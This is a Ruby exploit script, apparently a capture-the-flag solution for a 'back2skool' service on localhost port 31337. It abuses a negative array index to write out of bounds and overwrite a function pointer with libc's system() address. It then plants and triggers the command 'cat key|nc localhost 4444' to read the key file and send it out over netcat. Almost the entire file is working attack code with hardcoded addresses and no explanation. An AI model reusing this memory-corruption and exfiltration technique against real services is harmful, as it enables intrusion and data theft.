require 'socket'

class Back2skoolExploit
	def initialize(ip, port)
		@s = TCPSocket.new(ip, port)
	end

	def welcome
		21.times { puts @s.readline }
	end

	def read position
		@s.puts "read"
		puts @s.readline
		@s.puts position
		puts @s.readline
	end

	def write position, value
		@s.puts "write"
		puts @s.readline
		@s.puts position
		
		received = @s.readline
		puts received
		if not received.index "Table index too large!"
			@s.puts value
			puts @s.readline
		end
	end

	def values_string str
		str += "\x00" * (4 - (str.length % 4)) if str.length % 4 != 0
		values str.scan(/..../).map{|v| v.unpack("<I")[0]}
	end

	def values list
		if list.length > 10
			puts "[*] values : # of argument must be less than 10"
		end
		
		list.each_with_index do |x, y|
			write y, x
		end
	end

	def overwrite_math v
		write -2147483634, v 
	end

	def send_change
		list = [0x0804c074, 0x41414141, 0x08049bfc, 50, 0]
		values list
	end

	def doit
		@s.puts "math"
		puts @s.readline
	end

	def read_libc_start_main
		read -41
	end

	def exploit
		libc_start_main = 0xB75953E0
		system_offset = 0x26050
		system = libc_start_main + system_offset
		system = -1218726864
		
		welcome
		overwrite_math system
		values_string "cat key|nc localhost 4444\x00"

		pause
		doit
	end
	
	def pause
		STDIN.readline
	end
end




exploit = Back2skoolExploit.new('localhost', 31337)
exploit.exploit
